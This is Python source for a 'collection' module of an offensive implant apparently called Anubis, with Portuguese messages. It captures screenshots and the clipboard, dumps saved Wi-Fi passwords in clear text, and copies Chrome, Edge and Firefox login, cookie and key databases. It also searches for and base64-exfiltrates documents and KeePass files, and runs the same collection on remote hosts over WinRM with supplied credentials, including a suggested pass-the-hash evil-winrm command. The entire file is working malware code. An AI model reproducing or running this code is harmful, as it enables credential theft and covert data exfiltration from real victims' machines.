    # collection_ext — Anubis agent (MÉTODO da classe anubis)
    # MITRE TA0009 | scope=local | scope=remote (WinRM + password)
    # Retorno JSON: {"output","files","err"}

    def collection_ext(
        self,
        task_id,
        action="screenshot",
        path="",
        exts=".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt",
        keywords="",
        browser="chrome",
        all_drives=False,
        max_files=200,
        max_mb=50,
        scope="local",
        remote="",
        port=5985,
        username="",
        password="",
        nthash="",
        domain="",
        socks_port=7005,
    ):
        import os, sys, json, time, base64, subprocess, tempfile

        def resp(out="", files=None, err=""):
            return json.dumps({"output": out, "files": files or [], "err": err})

        def run(cmd, timeout=120):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
                return r.returncode, ((r.stdout or "") + (r.stderr or "")).strip()
            except Exception as e:
                return -1, str(e)

        def b64file(fp):
            try:
                with open(fp, "rb") as fh:
                    return base64.b64encode(fh.read()).decode()
            except OSError:
                return ""

        def ps_quote(s):
            return (s or "").replace("'", "''")

        action = str(action or "screenshot").lower().strip()
        path = str(path or "")
        exts = str(exts or ".doc,.docx,.xls,.xlsx,.pdf,.kdbx,.rdp,.txt")
        keywords = str(keywords or "")
        browser = str(browser or "chrome").lower().strip()
        scope = str(scope or "local").lower().strip()
        remote = str(remote or "").strip()
        username = str(username or "").strip()
        password = str(password or "")
        nthash = str(nthash or "").strip().replace(" ", "")
        domain = str(domain or "").strip()
        if isinstance(all_drives, str):
            all_drives = all_drives.strip().lower() in ("1", "true", "yes", "sim")
        all_drives = bool(all_drives)
        try:
            max_files = int(max_files)
        except (TypeError, ValueError):
            max_files = 200
        try:
            max_mb = int(max_mb)
        except (TypeError, ValueError):
            max_mb = 50
        try:
            port = int(port)
        except (TypeError, ValueError):
            port = 5985
        try:
            socks_port = int(socks_port)
        except (TypeError, ValueError):
            socks_port = 7005

        if sys.platform != "win32":
            return resp(err="collection_ext: implementado para Windows")

        # ═══════════════════════════════════════════════════════════════════
        # REMOTE (WinRM) — B via Invoke-Command; password obrigatorio no agente
        # ═══════════════════════════════════════════════════════════════════
        if scope in ("remote", "winrm"):
            if not remote:
                return resp(err="scope=remote exige remote (IP/host)")
            if not username:
                return resp(err="scope=remote exige username")
            if not password:
                msg = (
                    "scope=remote no agente exige password (PSCredential). "
                    "nthash nao autentica Invoke-Command nativo. "
                    "Use password, ou winrm_ext+SOCKS e collection local no pivo, "
                    "ou evil-winrm -H no operador."
                )
                extra = ""
                if nthash:
                    extra = (
                        "\n[*] nthash presente — operador via SOCKS %s:\n"
                        "  proxychains evil-winrm -i %s -u '%s\\%s' -H '%s' -P %s\n"
                        % (socks_port, remote, domain or ".", username, nthash, port)
                    )
                return resp(err=msg, out=extra)

            if action in ("screenshot", "clipboard"):
                return resp(
                    err="%s remote pouco confiavel (sessao/headless). Prefira scope=local "
                    "com desktop ou actions wifi|search|get|multiget|system_info|recent_files"
                    % action
                )

            user_logon = username
            if domain and "\\" not in username and "@" not in username:
                user_logon = "%s\\%s" % (domain, username)

            # browser remote -> search nos paths de perfil
            if action == "browser":
                action = "search"
                path = path or r"C:\Users"
                if browser == "firefox":
                    keywords = ",".join(
                        x for x in [keywords, "places.sqlite", "logins.json", "key4.db"] if x
                    )
                else:
                    keywords = ",".join(
                        x for x in [keywords, "Login Data", "Cookies", "History"] if x
                    )

            if action == "system_info":
                remote_sb = (
                    "$o=@();$o+=\"Host: $env:COMPUTERNAME\";"
                    "$o+=\"User: $env:USERDOMAIN\\$env:USERNAME\";"
                    "$o+=\"OS: $([Environment]::OSVersion.VersionString)\";"
                    "try{$o+=\"Domain: $((Get-CimInstance Win32_ComputerSystem).Domain)\"}catch{};"
                    "@{output=($o -join \"`n\");files=@();err=\"\"}|ConvertTo-Json -Compress"
                )
            elif action == "wifi":
                remote_sb = (
                    "$lines=@(); $profiles=netsh wlan show profiles 2>$null; "
                    "foreach($line in ($profiles -split \"`n\")){ "
                    "if($line -match ':\\s*(.+)$' -and ($line -match 'Perfil|Profile')){ "
                    "$name=$Matches[1].Trim(); if(-not $name){continue}; "
                    "$det=netsh wlan show profile name=\"$name\" key=clear 2>$null; $pwd=''; "
                    "foreach($l in ($det -split \"`n\")){ "
                    "if($l -match 'Key Content|Conteudo da Chave|Conteudo da Chave'){ "
                    "$pwd=($l -split ':',2)[1].Trim() } }; "
                    "$lines+=(\"SSID: {0,-30} Senha: {1}\" -f $name, $(if($pwd){$pwd}else{'<aberta>'})) } }; "
                    "$out=if($lines.Count -eq 0){'[*] Nenhum perfil Wi-Fi'}else{\"[+] $($lines.Count) perfil(es):`n$($lines -join \"`n\")\"}; "
                    "@{output=$out;files=@();err=\"\"}|ConvertTo-Json -Compress"
                )
            elif action == "recent_files":
                remote_sb = (
                    "$hits=@(); $roots=@(\"$env:APPDATA\\Microsoft\\Windows\\Recent\","
                    "\"$env:APPDATA\\Microsoft\\Office\\Recent\"); "
                    "foreach($root in $roots){ if(-not (Test-Path $root)){continue}; "
                    "Get-ChildItem $root -EA SilentlyContinue | Sort-Object LastWriteTime -Desc | "
                    "Select-Object -First 40 | ForEach-Object { "
                    "$hits+=(\"{0:yyyy-MM-dd HH:mm}  {1}\" -f $_.LastWriteTime, $_.FullName) } }; "
                    "$out=if($hits.Count -eq 0){'[*] Nada em Recent'}else{\"[+] Recent:`n$($hits -join \"`n\")\"}; "
                    "@{output=$out;files=@();err=\"\"}|ConvertTo-Json -Compress"
                )
            elif action == "search":
                root_ps = ps_quote(path)
                ext_ps = ps_quote(exts)
                kw_ps = ps_quote(keywords)
                ad = "1" if all_drives else "0"
                remote_sb = (
                    "$exts=('%s' -split ',')|%%{$_.Trim().ToLower()}|?{$_}; "
                    "$kws=('%s' -split ',')|%%{$_.Trim().ToLower()}|?{$_}; $max=%d; $roots=@(); "
                    "if('%s'){$roots=@('%s')}elseif(%s -eq 1){$roots=@('C:\\'); "
                    "Get-PSDrive -PSProvider FileSystem|?{$_.Name -match '^[D-Z]$'}|%%{$roots+=($_.Name+':\\')}} "
                    "else{$roots=@(\"$env:USERPROFILE\")}; $hits=@(); "
                    "foreach($root in $roots){ if(-not(Test-Path $root)){continue}; "
                    "Get-ChildItem -Path $root -Recurse -File -EA SilentlyContinue|%%{ "
                    "if($hits.Count -ge $max){return}; $n=$_.Name.ToLower(); $ok=$false; "
                    "foreach($e in $exts){ $e2=$e; if(-not $e2.StartsWith('.')){$e2='.'+$e2}; "
                    "if($n.EndsWith($e2)){$ok=$true;break} }; "
                    "if(-not $ok){ foreach($k in $kws){ if($n.Contains($k)){$ok=$true;break} } }; "
                    "if($ok){ $hits+=(\"{0,10}  {1}\" -f $_.Length, $_.FullName) } }; "
                    "if($hits.Count -ge $max){break} }; "
                    "$out=if($hits.Count -eq 0){'[*] Nenhum hit'}else{\"[+] $($hits.Count) hit(s):`n$($hits -join \"`n\")\"}; "
                    "@{output=$out;files=@();err=\"\"}|ConvertTo-Json -Compress"
                ) % (ext_ps, kw_ps, max_files, root_ps, root_ps, ad)
            elif action == "get":
                if not path:
                    return resp(err="get remote exige path")
                remote_sb = (
                    "$p='%s'; if(-not(Test-Path -LiteralPath $p -PathType Leaf)){ "
                    "@{output='';files=@();err=\"arquivo invalido: $p\"}|ConvertTo-Json -Compress } else { "
                    "$bytes=[IO.File]::ReadAllBytes($p); $b64=[Convert]::ToBase64String($bytes); "
                    "$name=[IO.Path]::GetFileName($p); "
                    "@{output=\"[+] $p ($($bytes.Length) bytes)\";files=@(@{name=$name;b64=$b64});err=''}"
                    "|ConvertTo-Json -Compress -Depth 5 }"
                ) % ps_quote(path)
            elif action == "multiget":
                root_ps = ps_quote(path) if path else ""
                remote_sb = (
                    "$exts=('%s' -split ',')|%%{$_.Trim().ToLower()}|?{$_}; "
                    "$kws=('%s' -split ',')|%%{$_.Trim().ToLower()}|?{$_}; "
                    "$maxF=%d; $maxB=%d*1024*1024; "
                    "$root=if('%s'){'%s'}else{\"$env:USERPROFILE\"}; $files=@(); $total=0; "
                    "if(Test-Path $root){ Get-ChildItem -Path $root -Recurse -File -EA SilentlyContinue|%%{ "
                    "if($files.Count -ge $maxF -or $total -ge $maxB){return}; $n=$_.Name.ToLower(); $ok=$false; "
                    "foreach($e in $exts){ $e2=$e; if(-not $e2.StartsWith('.')){$e2='.'+$e2}; "
                    "if($n.EndsWith($e2)){$ok=$true;break} }; "
                    "if(-not $ok){ foreach($k in $kws){ if($n.Contains($k)){$ok=$true;break} } }; "
                    "if(-not $ok){return}; try{ $bytes=[IO.File]::ReadAllBytes($_.FullName); "
                    "if(($total+$bytes.Length) -gt $maxB){return}; $total+=$bytes.Length; "
                    "$files+=@{name=$_.Name;b64=[Convert]::ToBase64String($bytes)} }catch{} } }; "
                    "$out=if($files.Count -eq 0){'[*] Nada'}else{\"[+] $($files.Count) arquivo(s) ($total bytes)\"}; "
                    "@{output=$out;files=$files;err=''}|ConvertTo-Json -Compress -Depth 6"
                ) % (ps_quote(exts), ps_quote(keywords), max_files, max_mb, root_ps, root_ps)
            else:
                return resp(
                    err="action remote: wifi|search|get|multiget|system_info|recent_files"
                )

            inv = (
                "$ErrorActionPreference='Stop'; "
                "$sec=ConvertTo-SecureString '%PASS%' -AsPlainText -Force; "
                "$cred=New-Object System.Management.Automation.PSCredential('%USER%',$sec); "
                "$sb={ %SB% }; "
                "try{ $r=Invoke-Command -ComputerName '%HOST%' -Credential $cred -Port %PORT% "
                "-Authentication Negotiate -ScriptBlock $sb -EA Stop; "
                "if($r -is [string]){$r}else{$r|ConvertTo-Json -Compress -Depth 8} "
                "}catch{ (@{output='';files=@();err=$_.Exception.Message})|ConvertTo-Json -Compress }"
            )
            inv = (
                inv.replace("%PASS%", ps_quote(password))
                .replace("%USER%", ps_quote(user_logon))
                .replace("%HOST%", ps_quote(remote))
                .replace("%PORT%", str(port))
                .replace("%SB%", remote_sb)
            )
            rc, out = run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    inv,
                ],
                timeout=300,
            )
            if not out:
                return resp(err="remote WinRM sem output (rc=%s)" % rc)
            try:
                start, end = out.find("{"), out.rfind("}")
                if start >= 0 and end > start:
                    blob = json.loads(out[start : end + 1])
                    return resp(
                        out=blob.get("output", "") or "",
                        files=blob.get("files") or [],
                        err=blob.get("err", "") or "",
                    )
            except Exception:
                pass
            if rc != 0:
                return resp(err="remote WinRM falhou: %s" % out[:800])
            return resp(out=out[:4000])

        # ═══════════════════════════════════════════════════════════════════
        # LOCAL
        # ═══════════════════════════════════════════════════════════════════
        tmp = tempfile.gettempdir()
        ts = time.strftime("%Y%m%d_%H%M%S")

        if action == "system_info":
            lines = [
                "Host: %s" % os.environ.get("COMPUTERNAME", ""),
                "User: %s\\%s"
                % (os.environ.get("USERDOMAIN", ""), os.environ.get("USERNAME", "")),
            ]
            try:
                lines.append("OS: %s" % str(sys.getwindowsversion()))
            except Exception:
                pass
            rc, ipcfg = run(["ipconfig"])
            if rc == 0:
                lines.append(ipcfg[:1500])
            return resp(out="[+] system_info\n" + "\n".join(lines))

        if action == "recent_files":
            hits = []
            roots = [
                os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Recent"),
                os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Office", "Recent"),
            ]
            for root in roots:
                if not os.path.isdir(root):
                    continue
                try:
                    names = sorted(
                        os.listdir(root),
                        key=lambda n: os.path.getmtime(os.path.join(root, n)),
                        reverse=True,
                    )
                except OSError:
                    continue
                for n in names[:40]:
                    fp = os.path.join(root, n)
                    try:
                        hits.append(
                            "%s  %s"
                            % (
                                time.strftime(
                                    "%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(fp))
                                ),
                                fp,
                            )
                        )
                    except OSError:
                        pass
            if not hits:
                return resp(out="[*] Nada em Recent")
            return resp(out="[+] Recent:\n" + "\n".join(hits))

        if action == "screenshot":
            shot = os.path.join(tmp, "an_%s.png" % ts)
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
                "$b=[System.Windows.Forms.SystemInformation]::VirtualScreen; "
                "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; "
                "$g=[System.Drawing.Graphics]::FromImage($bmp); "
                "$g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); "
                "$bmp.Save('%s'); $g.Dispose(); $bmp.Dispose(); Write-Output OK"
            ) % shot.replace("'", "''")
            rc, res = run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    ps,
                ],
                timeout=90,
            )
            data = b64file(shot)
            try:
                os.remove(shot)
            except OSError:
                pass
            if rc == 0 and data:
                return resp(
                    out="[+] Screenshot capturado e exfiltrado",
                    files=[{"name": "screenshot_%s.png" % ts, "b64": data}],
                )
            return resp(err="screenshot falhou: %s" % (res[:300] if res else "sem output"))

        if action == "clipboard":
            clip_img = os.path.join(tmp, "an_clip_%s.png" % ts)
            ps = (
                "Add-Type -AssemblyName System.Windows.Forms; "
                "$t=[System.Windows.Forms.Clipboard]::GetText(); "
                "$i=[System.Windows.Forms.Clipboard]::GetImage(); "
                "if((-not $t) -and $i){$i.Save('%s'); Write-Output CLIP_IMAGE} "
                "elseif($t){Write-Output ('CLIP_TEXT|'+$t)} else{Write-Output CLIP_EMPTY}"
            ) % clip_img.replace("'", "''")
            rc, res = run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-STA",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    ps,
                ],
                timeout=60,
            )
            if "CLIP_TEXT|" in res:
                return resp(
                    out="[+] Clipboard (texto):\n" + res.split("CLIP_TEXT|", 1)[1][:8000]
                )
            if "CLIP_IMAGE" in res:
                data = b64file(clip_img)
                try:
                    os.remove(clip_img)
                except OSError:
                    pass
                if data:
                    return resp(
                        out="[+] Clipboard imagem exfiltrada",
                        files=[{"name": "clipboard_%s.png" % ts, "b64": data}],
                    )
            if "CLIP_EMPTY" in res:
                return resp(out="[*] Clipboard vazio")
            return resp(err="clipboard falhou: %s" % (res[:300] if res else "sem output"))

        if action == "wifi":
            rc, profiles = run(["netsh", "wlan", "show", "profiles"])
            if rc != 0:
                return resp(err="netsh wlan falhou: %s" % profiles[:200])
            out_lines = []
            for line in profiles.splitlines():
                line = line.strip()
                if ":" in line and ("Perfil" in line or "Profile" in line):
                    name = line.split(":", 1)[1].strip()
                    if not name:
                        continue
                    _, det = run(
                        ["netsh", "wlan", "show", "profile", "name=%s" % name, "key=clear"]
                    )
                    pwd = ""
                    for l in det.splitlines():
                        if (
                            "Conteudo da Chave" in l
                            or "Key Content" in l
                            or "Conteúdo da Chave" in l
                        ):
                            pwd = l.split(":", 1)[1].strip()
                    out_lines.append("SSID: %-30s Senha: %s" % (name, pwd or "<aberta>"))
            if not out_lines:
                return resp(out="[*] Nenhum perfil Wi-Fi encontrado")
            return resp(
                out="[+] %d perfil(es) Wi-Fi:\n%s" % (len(out_lines), "\n".join(out_lines))
            )

        if action == "browser":
            local = os.environ.get("LOCALAPPDATA", "")
            roaming = os.environ.get("APPDATA", "")
            files = []
            if browser == "firefox":
                prof_root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
                if os.path.isdir(prof_root):
                    for prof in os.listdir(prof_root):
                        for fn in (
                            "places.sqlite",
                            "cookies.sqlite",
                            "logins.json",
                            "key4.db",
                            "formhistory.sqlite",
                        ):
                            fp = os.path.join(prof_root, prof, fn)
                            if os.path.isfile(fp):
                                data = b64file(fp)
                                if data:
                                    files.append(
                                        {"name": "firefox_%s_%s" % (prof[:8], fn), "b64": data}
                                    )
            elif browser in ("chrome", "edge"):
                base = (
                    os.path.join(local, "Google", "Chrome", "User Data", "Default")
                    if browser == "chrome"
                    else os.path.join(local, "Microsoft", "Edge", "User Data", "Default")
                )
                for fn in ("History", "Bookmarks", "Cookies", "Login Data", "Web Data"):
                    fp = os.path.join(base, fn)
                    if os.path.isfile(fp):
                        data = b64file(fp)
                        if data:
                            files.append(
                                {
                                    "name": "%s_%s" % (browser, fn.replace(" ", "_")),
                                    "b64": data,
                                }
                            )
            else:
                return resp(err="browser invalido (chrome/edge/firefox)")
            if not files:
                return resp(out="[*] Nenhum artefato de %s coletado" % browser)
            return resp(
                out="[+] %d arquivo(s) de %s (DPAPI no operador)" % (len(files), browser),
                files=files,
            )

        if action == "search":
            roots = [path] if path else [os.path.expanduser("~")]
            if all_drives and not path:
                roots = ["C:\\"] + [
                    c + ":\\"
                    for c in "DEFGHIJKLMNOPQRSTUVWXYZ"
                    if os.path.exists(c + ":\\")
                ]
            ext_list = []
            for e in exts.split(","):
                e = e.strip().lower()
                if not e:
                    continue
                if not e.startswith("."):
                    e = "." + e
                ext_list.append(e)
            kw = [k.lower() for k in keywords.split(",") if k.strip()]
            hits = []
            for root in roots:
                if not os.path.isdir(root):
                    continue
                for dirpath, dirnames, filenames in os.walk(root, topdown=True):
                    if root.endswith(":\\"):
                        dirnames[:] = [
                            d
                            for d in dirnames
                            if d
                            not in (
                                "Windows",
                                "Program Files",
                                "Program Files (x86)",
                                "$Recycle.Bin",
                            )
                        ]
                    for fn in filenames:
                        low = fn.lower()
                        if any(low.endswith(e) for e in ext_list) or (
                            kw and any(k in low for k in kw)
                        ):
                            fp = os.path.join(dirpath, fn)
                            try:
                                hits.append("%10d  %s" % (os.path.getsize(fp), fp))
                            except OSError:
                                pass
                            if len(hits) >= max_files:
                                break
                    if len(hits) >= max_files:
                        break
                if len(hits) >= max_files:
                    break
            if not hits:
                return resp(out="[*] Nenhum arquivo bateu com os criterios")
            return resp(out="[+] %d hit(s):\n%s" % (len(hits), "\n".join(hits)))

        if action == "get":
            if not path or not os.path.isfile(path):
                return resp(err="arquivo invalido: %s" % path)
            data = b64file(path)
            if not data:
                return resp(err="nao foi possivel ler: %s" % path)
            return resp(
                out="[+] %s exfiltrado (%d bytes)" % (path, (len(data) * 3) // 4),
                files=[{"name": os.path.basename(path), "b64": data}],
            )

        if action == "multiget":
            roots = [path] if path else [os.path.expanduser("~")]
            ext_list = []
            for e in exts.split(","):
                e = e.strip().lower()
                if not e:
                    continue
                if not e.startswith("."):
                    e = "." + e
                ext_list.append(e)
            kw = [k.lower() for k in keywords.split(",") if k.strip()]
            limit = max_mb * 1024 * 1024
            files, total = [], 0
            for root in roots:
                if not os.path.isdir(root):
                    continue
                for dirpath, dirnames, filenames in os.walk(root, topdown=True):
                    if root.endswith(":\\"):
                        dirnames[:] = [
                            d
                            for d in dirnames
                            if d
                            not in (
                                "Windows",
                                "Program Files",
                                "Program Files (x86)",
                                "$Recycle.Bin",
                            )
                        ]
                    for fn in filenames:
                        low = fn.lower()
                        if not (
                            any(low.endswith(e) for e in ext_list)
                            or (kw and any(k in low for k in kw))
                        ):
                            continue
                        fp = os.path.join(dirpath, fn)
                        try:
                            sz = os.path.getsize(fp)
                        except OSError:
                            continue
                        if total + sz > limit or len(files) >= max_files:
                            continue
                        data = b64file(fp)
                        if data:
                            total += sz
                            files.append({"name": os.path.basename(fp), "b64": data})
            if not files:
                return resp(out="[*] Nada coletado (criterios/limite)")
            return resp(
                out="[+] %d arquivo(s) (%d bytes)" % (len(files), total),
                files=files,
            )

        return resp(
            err=(
                "action: screenshot|clipboard|browser|wifi|search|get|multiget|"
                "system_info|recent_files | scope: local|remote"
            )
        )
